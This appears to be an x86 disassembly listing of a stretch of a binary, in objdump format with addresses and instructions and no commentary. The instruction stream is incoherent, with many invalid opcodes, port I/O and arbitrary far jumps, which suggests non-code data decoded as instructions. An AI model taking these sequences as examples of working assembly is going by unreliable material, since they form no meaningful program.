  4264e6:	sbb    edi,DWORD PTR [eax]
  4264e8:	ins    BYTE PTR es:[edi],dx
  4264e9:	dec    ebx
  4264ea:	cmp    edx,DWORD PTR [edx-0x10]
  4264ed:	pop    eax
  4264ee:	loopne 0x42656a
  4264f0:	xor    DWORD PTR [esi+0xf7ca561],esp
  4264f6:	pop    ebp
  4264f7:	cmp    BYTE PTR ds:0xb07513f9,dh
  4264fd:	sbb    ecx,DWORD PTR [esi]
  4264ff:	ins    BYTE PTR es:[edi],dx
  426500:	jno    0x42656e
  426502:	fild   QWORD PTR [ecx]
  426504:	sbb    BYTE PTR [ecx],ah
  426506:	jl     0x4264c8
  426508:	pop    esp
  426509:	inc    ah
  42650b:	in     eax,dx
  42650c:	enter  0x40e3,0xf8
  426510:	out    dx,al
  426511:	pop    ss
  426512:	(bad)  [esi-0x54983ff4]
  426518:	add    ebp,DWORD PTR [ebp-0x4a514360]
  42651e:	fisttp DWORD PTR [esi+0x2d2259ee]
  426524:	inc    eax
  426525:	or     dh,BYTE PTR [esi]
  426527:	xchg   esi,eax
  426528:	clc    
  426529:	in     eax,0x82
  42652b:	mov    esi,0xcb83af1b
  426530:	pop    ss
  426531:	aad    0x4c
  426533:	or     edx,DWORD PTR [edi+0x22]
  426536:	xor    al,0x3c
  426538:	fsubr  st(7),st
  42653a:	push   ebx
  42653b:	in     eax,dx
  42653c:	push   ebp
  42653d:	mov    BYTE PTR [ecx+0x63],ah
  426540:	jge    0x4264c8
  426542:	daa    
  426543:	xchg   esi,eax
  426544:	cmp    BYTE PTR [ecx*1-0x4e247972],dh
  42654b:	out    dx,eax
  42654c:	or     esi,DWORD PTR [ecx+0x11]
  42654f:	scas   al,BYTE PTR es:[edi]
  426550:	repnz outs dx,DWORD PTR ds:[esi]
  426552:	inc    edx
  426553:	(bad)  
  426555:	inc    edi
  426556:	dec    ebx
  426557:	push   ss
  426558:	mov    eax,0x764c9670
  42655d:	push   0x6b866538
  426562:	cwde   
  426563:	enter  0x87ba,0xb0
  426567:	xchg   edx,eax
  426568:	neg    DWORD PTR [eax+ebp*2]
  42656b:	sbb    eax,0x6c6202b2
  426570:	lods   al,BYTE PTR ds:[esi]
  426571:	mov    edx,0xa17a2076
  426576:	ret    
  426577:	inc    eax
  426578:	push   ecx
  426579:	aaa    
  42657a:	sbb    al,0xd3
  42657c:	sub    al,0x38
  42657e:	imul   ecx,DWORD PTR [edx+0x529703f1],0x7aa948fa
  426588:	(bad)
  42658b:	pop    eax
  42658c:	xchg   edi,eax
  42658d:	loope  0x426555
  42658f:	mov    esp,0x0
  426594:	add    BYTE PTR [eax],al
  426596:	add    BYTE PTR [eax],al
  426598:	add    BYTE PTR [eax],al
  42659a:	(bad)  
  42659b:	rol    BYTE PTR [edi],0x37
  42659e:	dec    edi
  42659f:	idiv   DWORD PTR [ebp-0x7c857b06]
  4265a5:	jg     0x426553
  4265a7:	jmp    0x426623
  4265a9:	and    ch,BYTE PTR [esi-0x1fffe24]
  4265af:	add    DWORD PTR [eax],eax
  4265b1:	add    BYTE PTR [ecx],dl
  4265b3:	adc    esp,esp
  4265b5:	push   esp
  4265b6:	sbb    al,0xfd
  4265b8:	xor    al,0x8a
  4265ba:	fist   DWORD PTR [edx]
  4265bc:	stos   BYTE PTR es:[edi],al
  4265bd:	mov    esi,esi
  4265bf:	mov    edi,0x94d0db3d
  4265c4:	movntq QWORD PTR [ebx],mm6
  4265c7:	scas   eax,DWORD PTR es:[edi]
  4265c8:	mov    dh,BYTE PTR [edi]
  4265ca:	xor    al,0xf1
  4265cc:	jmp    0x426554
  4265ce:	xchg   ebx,eax
  4265cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265d0:	mov    edx,0xc1972a1e
  4265d5:	mov    cl,0x4e
  4265d7:	add    ebp,DWORD PTR [ebx+0x67433056]
  4265dd:	xchg   ecx,eax
  4265de:	mov    ecx,0x1c35283
  4265e3:	inc    esi
  4265e4:	push   0x27
  4265e6:	jns    0x426608
  4265e8:	sahf   
  4265e9:	cmp    al,BYTE PTR [ebp+0x7b]
  4265ec:	fimul  DWORD PTR [eax-0x33]
  4265ef:	call   0xa649711a
  4265f4:	jecxz  0x4265ff
  4265f6:	out    dx,eax
  4265f7:	pop    ebx
  4265f8:	lods   al,BYTE PTR ds:[esi]
  4265f9:	sbb    al,0xaf
  4265fb:	cmp    DWORD PTR [edx+0x58],ebx
  4265fe:	ja     0x426593
  426600:	dec    esp
  426601:	pushf  
  426602:	pop    ecx
  426603:	mov    esi,0x23c3d82b
  426608:	push   ebp
  426609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42660a:	xchg   ebx,eax
  42660b:	sahf   
  42660c:	jecxz  0x4265e0
  42660e:	mov    ds:0x2f7fcd64,eax
  426613:	sbb    edi,DWORD PTR [ecx]
  426615:	loop   0x426611
  426617:	push   edi
  426618:	dec    ecx
  426619:	lods   eax,DWORD PTR ds:[esi]
  42661a:	push   edi
  42661b:	push   ebp
  42661c:	sbb    eax,0xa72237db
  426621:	mov    ds:0x6de38626,eax
  426626:	inc    esp
  426627:	retf   0x7470
  42662a:	inc    edx
  42662b:	ins    DWORD PTR es:[edi],dx
  42662c:	lods   eax,DWORD PTR ds:[esi]
  42662d:	jnp    0x426632
  42662f:	cmp    DWORD PTR [esi+0x77],ebp
  426632:	shl    eax,1
  426634:	mov    esi,0x9d702aa0
  426639:	inc    esp
  42663a:	hlt    
  42663b:	adc    esi,eax
  42663d:	daa    
  42663e:	int3   
  42663f:	jbe    0x4265d0
  426641:	in     eax,0xd8
  426643:	std    
  426644:	or     DWORD PTR [ecx],edx
  426646:	int    0xf4
  426648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426649:	sbb    BYTE PTR [edi],0x90
  42664c:	or     DWORD PTR [ebp-0x43443d3d],0x3862e600
  426656:	jae    0x42664d
  426658:	xchg   ebp,eax
  426659:	nop
  42665a:	xor    bh,BYTE PTR [esi-0x6631672b]
  426660:	mov    ebx,DWORD PTR [bx+0x6c]
  426664:	sar    BYTE PTR [ebx-0x22e21bba],0xe2
  42666b:	xchg   ebp,eax
  42666c:	imul   eax,DWORD PTR [edx],0x37
  42666f:	inc    ebp
  426670:	inc    ecx
  426671:	xor    BYTE PTR [edx-0x6c8a579b],dl
  426677:	pop    ds
  426678:	sub    eax,0xe1933c7e
  42667d:	jg     0x42667f
  42667f:	xchg   edx,eax
  426680:	adc    ch,BYTE PTR [edx]
  426682:	adc    BYTE PTR [esi],al
  426684:	mov    al,0x3c
  426686:	mov    ebp,0x833eb893
  42668b:	ret    
  42668c:	cld    
  42668d:	mov    al,0x1f
  42668f:	pop    eax
  426690:	jno    0x426636
  426692:	ins    DWORD PTR es:[edi],dx
  426693:	push   ebx
  426694:	sbb    ah,BYTE PTR [di+0x41]
  426698:	aad    0x62
  42669a:	hlt    
  42669b:	xor    eax,0x4aced128
  4266a0:	push   esi
  4266a1:	inc    ebx
  4266a2:	out    dx,eax
  4266a3:	scas   ax,WORD PTR es:[edi]
  4266a5:	jo     0x42665e
  4266a7:	mov    dl,0x3e
  4266a9:	les    esi,FWORD PTR [edi-0x37]
  4266ac:	cmp    eax,0x8ac56bed
  4266b1:	ss iret 
  4266b3:	inc    ebp
  4266b4:	mov    ds:0x6bc26b47,al
  4266b9:	gs (bad) 
  4266bb:	cmc    
  4266bc:	pop    esp
  4266bd:	ss pushf 
  4266bf:	sub    edx,edx
  4266c1:	cdq    
  4266c2:	and    al,BYTE PTR [ebp-0x3b]
  4266c5:	push   0x5b064a19
  4266ca:	loope  0x42671a
  4266cc:	loopne 0x42667a
  4266ce:	leave  
  4266cf:	cli    
  4266d0:	scas   al,BYTE PTR es:[edi]
  4266d1:	not    DWORD PTR [edi-0x64]
  4266d4:	cmp    BYTE PTR [esi],dh
  4266d6:	cli    
  4266d7:	aad    0x8f
  4266d9:	pop    ds
  4266da:	fcmovbe st,st(6)
  4266dc:	call   0x8fb17ecc
  4266e1:	pop    ebx
  4266e2:	add    cl,BYTE PTR [ebp-0x1c7a511e]
  4266e8:	add    al,0xca
  4266ea:	jmp    FWORD PTR [esi+0x2b]
  4266ed:	outs   dx,DWORD PTR ds:[esi]
  4266ee:	js     0x426726
  4266f0:	push   esp
  4266f1:	sbb    BYTE PTR [ebx+esi*4+0x7d],al
  4266f5:	mov    ebx,0x8559f91d
  4266fa:	push   cs
  4266fb:	jne    0x4266d0
  4266fd:	aad    0x49
  4266ff:	mov    ebp,0x371f8102
  426704:	mov    ch,0x9f
  426706:	sbb    ebx,esi
  426708:	out    dx,eax
  426709:	sub    ecx,DWORD PTR [eax+0x51]
  42670c:	stos   DWORD PTR es:[edi],eax
  42670d:	mov    bh,bh
  42670f:	js     0x42678c
  426711:	dec    esp
  426712:	outs   dx,BYTE PTR ds:[esi]
  426713:	(bad)  
  426714:	les    ebx,FWORD PTR [esi+eiz*2-0x4c4429f7]
  42671b:	mov    bh,0x88
  42671d:	xlat   BYTE PTR ds:[ebx]
  42671e:	xor    BYTE PTR [edx-0x4da349e0],0xc4
  426725:	ds mov ebx,0xf524816f
  42672b:	ins    DWORD PTR es:[edi],dx
  42672c:	jecxz  0x426739
  42672e:	mov    WORD PTR [eax],ss
  426730:	rol    BYTE PTR [ebp+0x249fbb8f],cl
  426736:	inc    ebp
  426737:	pop    es
  426738:	add    al,0xa9
  42673a:	(bad)  
  42673b:	pop    ebp
  42673c:	mov    ds,WORD PTR [ebp+0x3ac490c4]
  426742:	cmp    eax,0xdce7c80c
  426747:	mov    ch,0xa8
  426749:	mov    ds:0xcc99cfca,al
  42674e:	cs gs push ebp
  426751:	ret    0x5db2
  426754:	xor    eax,0xffffff9c
  426757:	addr16 jge 0x42672a
  42675a:	mov    ch,0x36
  42675c:	mov    edx,0x24dfd53e
  426761:	test   BYTE PTR [edi],0xee
  426764:	or     al,0x1f
  426766:	test   BYTE PTR [eax],bh
  426768:	repz jmp 0x4267d0
  42676b:	cmp    cl,bl
  42676d:	push   ds
  42676e:	loopne 0x4266fb
  426770:	jo     0x426767
  426772:	push   cs
  426773:	xchg   DWORD PTR [edx+0xe69f989],ecx
  426779:	inc    ebx
  42677a:	adc    al,0x26
  42677c:	inc    edi
  42677d:	jg     0x42672d
  42677f:	jae    0x42671f
  426781:	iret   
  426782:	pusha  
  426783:	in     eax,dx
  426784:	popa   
  426785:	push   cs
  426786:	or     cl,BYTE PTR [esp+eax*2]
  426789:	jne    0x4267e5
  42678b:	xchg   BYTE PTR [edi],bl
  42678d:	mov    dh,0xbc
  42678f:	dec    esi
  426790:	jmp    0xb463e49b
  426795:	cmp    al,BYTE PTR [ebp+0x68136063]
  42679b:	stos   BYTE PTR es:[edi],al
  42679c:	cld    
  42679d:	push   esi
  42679e:	in     eax,0x60
  4267a0:	jp     0x4267fb
  4267a2:	mov    bl,0xda
  4267a4:	cmc    
  4267a5:	jno    0x4267f6
  4267a7:	xor    ebp,edi
  4267a9:	inc    edx
  4267aa:	mov    ah,BYTE PTR [ecx-0x420a457]
	...
  4267b8:	add    BYTE PTR [eax],al
  4267ba:	mov    al,0x8a
  4267bc:	call   0xfa266242
  4267c1:	mov    ebx,0xcae72888
  4267c6:	pop    esi
  4267c7:	and    ah,bh
  4267c9:	sbb    ebp,DWORD PTR [esi+ebx*8+0x1fe0001]
  4267d0:	add    BYTE PTR [eax],al
  4267d2:	loop   0x42683e
  4267d4:	stc    
  4267d5:	mov    al,ds:0xf001ad0b
  4267da:	fstp   TBYTE PTR [ecx]
  4267dc:	mov    dh,0xea
  4267de:	(bad)  [eax+ecx*8+0x53094ad9]
  4267e5:	out    0x9c,al
  4267e7:	or     esi,0xa16ad4c6
  4267ed:	xchg   edi,eax
  4267ee:	or     BYTE PTR [ecx+edi*4+0xa38eb94],bl
  4267f5:	aad    0x8e
  4267f7:	arpl   WORD PTR [eax+0x58],bp
  4267fa:	ret    
  4267fb:	sbb    eax,0x1f6ee8d
  426800:	or     al,0x3c
  426802:	aad    0x10
  426804:	mov    al,0xd7
  426806:	mov    esp,DWORD PTR [ebp-0x2c]
  426809:	das    
  42680a:	dec    ecx
  42680b:	xchg   esi,eax
  42680c:	mov    ah,0xf9
  42680e:	clc    
  42680f:	mov    esi,ebp
  426811:	fwait
  426812:	xchg   edx,eax
  426813:	loope  0x4267b6
  426815:	je     0x426822
  426817:	jo     0x426857
  426819:	xchg   edx,eax
  42681a:	dec    eax
  42681b:	ror    esi,0xcc
  42681e:	adc    esi,DWORD PTR [ecx-0x6be8dcaa]
  426824:	xchg   ebp,eax
  426825:	adc    ch,BYTE PTR [edi+0x9]
  426828:	add    al,0x85
  42682a:	mov    bl,0xb3
  42682c:	fst    DWORD PTR [ebx]
  42682e:	lods   al,BYTE PTR ds:[esi]
  42682f:	mov    eax,ds:0xc50a1e8f
  426834:	ficom  WORD PTR [edi+0x2d218704]
  42683a:	dec    edx
  42683b:	xchg   eax,ecx
  42683d:	out    dx,eax
  42683e:	fcomp  DWORD PTR [esi]
  426840:	jmp    0x71c9:0x6b0c6c05
  426847:	nop
  426848:	ins    DWORD PTR es:[edi],dx
  426849:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42684a:	ins    BYTE PTR es:[edi],dx
  42684b:	addr16 push edi
  42684d:	mov    ebp,0xa24a603c
  426852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426853:	mov    edx,0xd644bac4
  426858:	or     al,0x50
  42685a:	iret   
  42685b:	and    BYTE PTR [eax-0xaf000d3],bh
  426861:	and    al,0xd9
  426863:	popa   
  426864:	inc    ebx
  426865:	out    0xe8,al
  426867:	cmp    ch,BYTE PTR [edi+0x288e60c6]
  42686d:	mov    dl,0x7c
  42686f:	cmp    BYTE PTR [edi+0x1b0033a6],dh
  426875:	out    dx,eax
  426876:	mov    dh,BYTE PTR [esi+edi*1+0x36c3093c]
  42687d:	out    0x0,eax
  42687f:	stc    
  426880:	fmul   DWORD PTR [ecx-0x21]
  426883:	adc    esp,DWORD PTR [edi+0x48018f14]
  426889:	mov    ah,0xff
  42688b:	dec    esp
  42688c:	adc    eax,0xa43dbd2e
  426891:	push   es
  426892:	jle    0x42686f
  426894:	fmulp  st(2),st
  426896:	call   0x4482606
  42689b:	lahf   
  42689c:	inc    ebx
  42689d:	mov    gs,ebp
  42689f:	rcl    DWORD PTR [ecx-0x6c],cl
  4268a2:	js     0x4268cb
  4268a4:	add    cl,BYTE PTR [eax]
  4268a6:	pusha  
  4268a7:	push   0xffffff94
  4268a9:	dec    edi
  4268aa:	test   BYTE PTR [edi-0x6ef9f08d],0xee
  4268b1:	mov    cl,0xce
  4268b3:	mov    esi,ecx
  4268b5:	icebp  
  4268b6:	ret    
  4268b7:	sbb    bh,bh
  4268b9:	push   ebx
  4268ba:	lock sbb ebx,ebp
  4268bd:	in     eax,dx
  4268be:	dec    edx
  4268bf:	mov    al,ds:0x161302ad
  4268c4:	fwait
  4268c5:	pusha  
  4268c6:	or     esi,esp
  4268c8:	mov    ds:0x3a9b0dce,eax
  4268cd:	pop    es
  4268ce:	(bad)  
  4268cf:	mov    eax,0x6fe5028e
  4268d4:	inc    esp
  4268d5:	shl    DWORD PTR [eax],0x10
  4268d8:	mov    esp,0xf3e40d8f
  4268dd:	and    esp,DWORD PTR [edx+0x74]
  4268e0:	out    0x91,eax
  4268e2:	add    ah,ch
  4268e4:	mov    ebp,0x13f945d6
  4268e9:	das    
  4268ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268eb:	pop    eax
  4268ec:	lock mov ds:0x8b926618,eax
  4268f2:	es aaa 
  4268f4:	add    eax,0x2b34917d
  4268f9:	dec    esi
  4268fa:	pop    edx
  4268fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268fc:	leave  
  4268fd:	mov    ecx,0xfb0791ea
  426902:	push   esi
  426903:	not    DWORD PTR [ebx-0x1f]
  426906:	fs fs jo 0x426970
  42690a:	adc    ebx,DWORD PTR [ecx]
  42690c:	and    eax,0x215a1e66
  426911:	dec    ecx
  426912:	add    bh,BYTE PTR [edi-0x2462bfd0]
  426918:	sbb    al,0x54
  42691a:	mov    bh,0xd9
  42691c:	adc    DWORD PTR ds:0x719b65ba,esp
  426922:	mov    bl,0xe6
  426924:	fistp  QWORD PTR [eax]
  426926:	push   ecx
  426927:	(bad)  
  426928:	push   ecx
  426929:	popa   
  42692a:	mov    ah,BYTE PTR [ebp-0x2ee2f40c]
  426930:	push   0xc3adee48
  426935:	jo     0x4268c8
  426937:	mov    al,0xb5
  426939:	dec    edx
  42693a:	(bad)  
  42693b:	repnz (bad) 
  42693d:	jl     0x4268ee
  42693f:	mov    ch,0xd7
  426941:	loop   0x42699f
  426943:	adc    eax,0x71
  426946:	mov    cl,0x4e
  426948:	ins    BYTE PTR es:[edi],dx
  426949:	mov    al,ds:0x5bec39ac
  42694e:	mov    esp,0x954d68b5
  426953:	xor    esi,edi
  426955:	add    eax,0xee43ac1c
  42695a:	cli    
  42695b:	jb     0x426954
  42695d:	rcr    esp,cl
  42695f:	dec    esi
  426960:	dec    eax
  426961:	add    DWORD PTR [esi-0x138e2d28],edi
  426967:	(bad)  
  426968:	hlt    
  426969:	retf   0x30a
  42696c:	test   eax,0xfb4f25e4
  426971:	or     al,0xfa
  426973:	xchg   cl,bl
  426975:	sar    BYTE PTR [edx-0x73],cl
  426978:	lods   al,BYTE PTR ds:[esi]
  426979:	lods   eax,DWORD PTR ds:[esi]
  42697a:	and    esp,eax
  42697c:	push   cs
  42697d:	pop    ds
  42697e:	jne    0x4269c0
  426980:	mov    bh,0x9a
  426982:	pop    eax
  426983:	pop    es
  426984:	fmul   st,st(2)
  426986:	sub    DWORD PTR [ebp+0x3b0395d],ecx
  42698c:	sbb    BYTE PTR [esi],ch
  42698e:	fstp   TBYTE PTR [eax+0x7d1e040f]
  426994:	cmp    BYTE PTR [edi],dh
  426996:	pop    edx
  426997:	sub    al,dl
  426999:	stc    
  42699a:	pop    es
  42699b:	push   edi
  42699c:	jbe    0x4269b0
  42699e:	fnsave [edi+ecx*4+0x34]
  4269a2:	add    al,0x9
  4269a4:	xchg   esi,eax
  4269a5:	cmc    
  4269a6:	xor    dh,BYTE PTR [esi]
  4269a8:	mov    DWORD PTR [ecx+0x6b],edi
  4269ab:	add    ch,bh
  4269ad:	push   ebx
  4269ae:	jb     0x42695c
  4269b0:	fs test cl,cl
  4269b3:	jmp    DWORD PTR [edx+ebx*4+0x37c45917]
  4269ba:	jmp    0xd048:0x6d2715e6
  4269c1:	xor    DWORD PTR [ebp-0x52],ebx
  4269c4:	fild   DWORD PTR [eax+ecx*1-0x3a]
  4269c8:	cdq    
  4269c9:	jle    0x4269c4
  4269cb:	xchg   edx,eax
  4269cc:	int    0xd5
  4269ce:	es iret 
	...
  4269d8:	add    BYTE PTR [eax],al
  4269da:	mov    cl,BYTE PTR [esp+eax*8-0x61253926]
  4269e1:	fcomp  QWORD PTR [edi+0x23]
  4269e4:	or     al,0x8a
  4269e6:	sub    ebp,esi
  4269e8:	jmp    0x426a05
  4269ea:	stos   BYTE PTR es:[edi],al
  4269eb:	loopne 0x4269ee
  4269ed:	add    dh,bh
  4269ef:	add    DWORD PTR [eax],eax
  4269f1:	add    BYTE PTR [edx-0x55],cl
  4269f4:	push   edx
  4269f5:	je     0x426a0a
  4269f7:	dec    ebx
  4269f8:	imul   ebp,DWORD PTR [edi-0x6863b5e7]
  4269ff:	jbe    0x18186bd6
  426a05:	add    ch,bh
  426a07:	mov    al,ds:0xdabf95dd
  426a0c:	ret    0x98bc
  426a0f:	shl    edx,0x55
  426a12:	dec    esp
  426a13:	fsub   QWORD PTR [edi]
  426a15:	push   es
  426a16:	les    esp,FWORD PTR [ebx-0x4d0259b7]
  426a1c:	jbe    0x426a34
  426a1e:	idiv   DWORD PTR [ecx+0x69]
  426a21:	ins    DWORD PTR es:[edi],dx
  426a22:	add    DWORD PTR [edi+0x5a368182],edi
  426a28:	sub    al,0x78
  426a2a:	mov    DWORD PTR [ebx-0x6f],ecx
  426a2d:	jmp    0x426a7a
  426a2f:	fldcw  WORD PTR [edx]
  426a31:	push   esp
  426a32:	dec    edx
  426a33:	mov    al,0xab
  426a35:	es mov edi,0x9e27ab2d
  426a3b:	stc    
  426a3c:	rcl    DWORD PTR [ecx-0x7d056b74],cl
  426a42:	cwde   
  426a43:	and    DWORD PTR [esi-0x5515008f],edx
  426a49:	xchg   edi,eax
  426a4a:	xlat   BYTE PTR ds:[ebx]
  426a4c:	std    
  426a4d:	test   eax,0x6520ae36
  426a52:	fwait
  426a53:	mov    edx,0x1b611085
  426a58:	enter  0x7066,0xf4
  426a5c:	mov    al,ds:0xdfe79212
  426a61:	fdiv   DWORD PTR [esi+0x20]
  426a64:	cmp    cl,BYTE PTR [ecx+0xccc8ea3]
  426a6a:	int3   
  426a6b:	aas    
  426a6c:	inc    ebp
  426a6d:	ss mov al,0x6c
  426a70:	or     edx,DWORD PTR [edx]
  426a72:	(bad)  
  426a73:	fisubr DWORD PTR [ecx-0x2f]
  426a76:	xchg   edx,eax
  426a77:	loopne 0x426aa1
  426a79:	xlat   BYTE PTR ds:[ebx]
  426a7a:	jne    0x426a08
  426a7c:	mov    ebx,0xfd5d4135
  426a81:	lahf   
  426a82:	fcom   DWORD PTR [ebx+0x78]
  426a85:	xor    BYTE PTR [ebx+0x51],dl
  426a88:	mov    esp,0x7d1c7de4
  426a8d:	cmp    DWORD PTR [edx+0x2c],edi
  426a90:	retf   0x6a20
  426a93:	mul    dh
  426a95:	inc    edi
  426a96:	rcr    DWORD PTR [ecx+0x46],0x8c
  426a9a:	mov    ebx,DWORD PTR [ecx]
  426a9c:	lock add bh,BYTE PTR [ebx+0x72]
  426aa0:	mov    eax,0xa5d7d3e0
  426aa5:	imul   edx,DWORD PTR [eax+0x4be4b9a4],0xf3db7d2b
  426aaf:	sbb    eax,0x5447b2fc
  426ab4:	pop    esi
  426ab5:	mov    esi,0x410a7a45
  426aba:	add    eax,0x3b4bda92
  426abf:	mov    al,ds:0x6d1f5d60
  426ac4:	and    DWORD PTR [ebx+0x66bab117],esi
  426aca:	shr    ebp,1
  426acc:	xchg   edx,eax
  426acd:	push   ds
  426ace:	or     BYTE PTR [eax+ebp*2+0x7a2da5a6],dh
  426ad5:	push   ecx
  426ad6:	jmp    FWORD PTR [ebx+0x6d39afe4]
  426adc:	dec    eax
  426add:	mov    ebp,0x653f6824
  426ae2:	ins    BYTE PTR es:[edi],dx
  426ae3:	jne    0x426ac5
  426ae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ae6:	sar    DWORD PTR [ebx+ebx*4-0x54499e2f],0x88
  426aee:	or     esp,DWORD PTR [ecx+0x18]
  426af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426af2:	stos   DWORD PTR es:[edi],eax
  426af3:	lds    esp,FWORD PTR [ecx]
  426af5:	retf   
  426af6:	fstp   TBYTE PTR [eax+0xd56239]
  426afc:	adc    eax,DWORD PTR [edi]
  426afe:	ins    DWORD PTR es:[edi],dx
  426aff:	idiv   ah
  426b01:	pop    es
  426b02:	into   
  426b03:	or     esi,DWORD PTR ds:0x56870210
  426b09:	dec    esi
  426b0a:	lock mov ebx,0x7311363b
  426b10:	repz sbb BYTE PTR [eax+0x63d8bd5d],0xad
  426b18:	sbb    eax,DWORD PTR [edi-0x7b4e3083]
  426b1e:	add    bl,0x41
  426b21:	stc    
  426b22:	pushf  
  426b23:	rcl    DWORD PTR [ebp-0x461557b9],cl
  426b29:	(bad)  
  426b2a:	ins    DWORD PTR es:[edi],dx
  426b2b:	mov    edi,0xd704cb6e
  426b30:	lahf   
  426b31:	lods   eax,DWORD PTR ds:[esi]
  426b32:	jge    0x426ba9
  426b34:	out    dx,al
  426b35:	fdivr  QWORD PTR [eax+ebp*2+0x3e]
  426b39:	pop    esp
  426b3a:	dec    ebx
  426b3b:	in     eax,dx
  426b3c:	aad    0x37
  426b3e:	mov    dh,ah
  426b40:	out    0x66,al
  426b42:	or     DWORD PTR [edi-0x58],edi
  426b45:	sub    al,0x84
  426b47:	dec    esp
  426b48:	pop    ecx
  426b49:	out    0x3a,eax
  426b4b:	and    esp,DWORD PTR [ecx-0x136c7f19]
  426b51:	push   0x139cfa2d
  426b56:	int    0x74
  426b58:	push   esp
  426b59:	jnp    0x426b84
  426b5b:	out    0xe0,al
  426b5d:	retf   0x1f5d
  426b60:	inc    ecx
  426b61:	mov    dl,0xec
  426b63:	mov    ch,0xe5
  426b65:	jge    0x426b27
  426b67:	aas    
  426b68:	mov    WORD PTR [edi+0x742674ee],cs
  426b6e:	jecxz  0x426b0a
  426b70:	rol    BYTE PTR [edx+0x40],1
  426b73:	cld    
  426b74:	cdq    
  426b75:	dec    edx
  426b76:	mov    esi,0x3041cb9b
  426b7b:	ret    
  426b7c:	xchg   ecx,eax
  426b7d:	mov    ebx,0x49e1c274
  426b82:	pop    esp
  426b83:	cmp    eax,0x701882c9
  426b88:	pop    eax
  426b89:	jo     0x426b2b
  426b8b:	dec    edi
  426b8c:	les    esi,FWORD PTR [ebp*4+0x181a144f]
  426b93:	repz pop ebx
  426b95:	rcr    BYTE PTR ss:[ebx+0x2c],1
  426b99:	pop    ebx
  426b9a:	addr16 out dx,eax
  426b9c:	iret   
  426b9d:	lea    ecx,[edx]
  426b9f:	arpl   WORD PTR [esi-0x4a65cec9],dx
  426ba5:	sub    BYTE PTR [esi-0x43],al
  426ba8:	inc    edx
  426ba9:	in     al,dx
  426baa:	xchg   DWORD PTR [ecx-0x478fb9f5],ebx
  426bb0:	pop    edx
  426bb1:	xchg   esp,eax
  426bb2:	dec    ebx
  426bb3:	dec    ecx
  426bb4:	ins    BYTE PTR es:[edi],dx
  426bb5:	mov    al,ds:0xddc7ceb3
  426bba:	xchg   DWORD PTR [eax-0x71],eax
  426bbd:	adc    al,0xe1
  426bbf:	test   BYTE PTR [edi-0x306c4332],bl
  426bc5:	jmp    0xbefb:0x1b3805c5
  426bcc:	mov    ebx,0xfe8aa55c
  426bd1:	add    BYTE PTR [esi-0x6b],dh
  426bd4:	mov    cl,0x42
  426bd6:	stos   BYTE PTR es:[edi],al
  426bd7:	ja     0x426b79
  426bd9:	sahf   
  426bda:	shl    ch,1
  426bdc:	loop   0x426c11
  426bde:	xchg   edi,eax
  426bdf:	mov    dl,0x78
  426be1:	cmp    DWORD PTR [ecx],ebx
  426be3:	sbb    bh,bl
  426be5:	mov    eax,0x55ec35c8
  426bea:	adc    eax,0xc1bba1de
  426bef:	or     BYTE PTR [eax],al
	...
  426bf9:	add    BYTE PTR [eax-0x56],al
  426bfc:	pop    edx
  426bfd:	sbb    bh,dl
  426bff:	cli    
  426c00:	inc    eax
  426c01:	cli    
  426c02:	mov    ds:0x1efe433f,al
  426c07:	jecxz  0x426c7f
  426c09:	out    dx,al
  426c0a:	test   al,0xe2
  426c0c:	add    DWORD PTR [eax],eax
  426c0e:	inc    BYTE PTR [ecx]
  426c10:	add    BYTE PTR [eax],al
  426c12:	mov    ebp,0xe53090c1
  426c17:	sbb    BYTE PTR [eax],ah
  426c19:	add    bh,BYTE PTR [ebp+0x4]
  426c1c:	stc    
  426c1d:	dec    ebp
  426c1e:	mov    edi,0xabdf6ba8
  426c23:	leave  
  426c24:	adc    ebx,ecx
  426c26:	inc    esp
  426c27:	inc    ebp
  426c28:	inc    eax
  426c29:	inc    eax
  426c2a:	sbb    DWORD PTR [eax+0x77a43ad0],ebp
  426c30:	mov    edx,0x549763a1
  426c35:	cli    
  426c36:	int    0xb7
  426c38:	mov    esi,0xcbd87dff
  426c3d:	(bad)  
  426c3f:	jp     0x426c29
  426c41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c42:	mov    cl,0x84
  426c44:	shl    esp,cl
  426c46:	or     dh,bh
  426c48:	nop
  426c49:	push   cs
  426c4a:	adc    eax,0xbb14af3e
  426c4f:	sub    eax,ebp
  426c51:	mov    edx,DWORD PTR [ecx]
  426c53:	nop
  426c54:	push   esi
  426c55:	in     al,0x43
  426c57:	aaa    
  426c58:	push   0xffffffa6
  426c5a:	push   edi
  426c5b:	add    al,0xd0
  426c5d:	inc    ecx
  426c5e:	adc    esi,DWORD PTR [ebx]
  426c60:	and    eax,0x62a7e031
  426c65:	in     al,0x5f
  426c67:	outs   dx,BYTE PTR ds:[esi]
  426c68:	or     esp,DWORD PTR ds:[esi]
  426c6b:	add    esi,DWORD PTR [eax]
  426c6d:	mov    esi,0x2f623622
  426c72:	mov    edi,0x55d96031
  426c77:	jmp    0xd604:0x39702640
  426c7e:	cmp    al,0x73
  426c80:	pop    ebp
  426c81:	sbb    al,0x27
  426c83:	push   ecx
  426c84:	mov    dl,0x5a
  426c86:	int    0xbe
  426c88:	(bad)  [edi+0x7a9ecb93]
  426c8e:	in     al,0x6d
  426c90:	jmp    DWORD PTR [edi-0x4d]
  426c93:	sbb    eax,0x8c0e8c46
  426c98:	pop    edx
  426c99:	dec    esp
  426c9a:	cmp    BYTE PTR [ebp+0x7ec07e4e],0x2b
  426ca1:	dec    ecx
  426ca2:	xchg   ebp,eax
  426ca3:	out    0xc6,al
  426ca5:	mov    eax,ebp
  426ca7:	sub    DWORD PTR [edi+0x2c],esp
  426caa:	test   DWORD PTR [esp+ebp*8-0x7d8a45ff],eax
  426cb1:	out    dx,al
  426cb2:	cmp    edx,ebx
  426cb4:	imul   ebx,DWORD PTR ds:0xd09270ad,0x77
  426cbb:	push   esi
  426cbc:	out    dx,al
  426cbd:	jmp    0x426cce
  426cbf:	inc    edx
  426cc0:	jmp    0x7a3e9f8c
  426cc5:	cmp    cl,bl
